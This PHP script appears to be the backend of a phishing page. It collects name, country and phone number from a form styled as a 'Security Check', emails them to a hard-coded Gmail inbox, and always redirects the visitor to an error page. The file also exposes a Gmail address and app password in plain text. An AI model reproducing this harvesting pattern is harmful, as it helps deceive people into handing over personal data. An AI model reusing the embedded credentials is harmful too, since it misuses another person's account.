<?php
// Load Composer's autoloader
require 'vendor/autoload.php';

// Import PHPMailer classes into the global namespace
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Create an instance of PHPMailer
$mail = new PHPMailer(true);

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Collect POST data
    $name = $_POST['name'] ?? '';
    $country = $_POST['country'] ?? '';
    $phone = $_POST['phone'] ?? '';

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com'; // Use Gmail's SMTP server
        $mail->SMTPAuth = true;
        $mail->Username = 'yahyaahmed9929@gmail.com'; // Your email address
        $mail->Password = 'ewap tvrj zejq iafy'; // Your app-specific password (with spaces)
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587; // TLS port

        // Recipients
        $mail->setFrom('yahyaahmed9929@gmail.com', 'Mailer');
        $mail->addAddress('yahyaahmed9929@gmail.com', 'Your Name'); // Your email address

        // Content
        $mail->isHTML(true);
        $mail->Subject = 'Security Check Details';
        $mail->Body = "Name: $name<br>Country: $country<br>Phone: $phone";

        // Send the email
        $mail->send();
        
        // Redirect to err.html after email is sent successfully
        header('Location: err.html');
        exit;
    } catch (Exception $e) {
        // If email sending fails, redirect to err.html
        header('Location: err.html');
        exit;
    }
} else {
    // If the form is not submitted via POST, redirect to err.html
    header('Location: err.html');
    exit;
}
?>
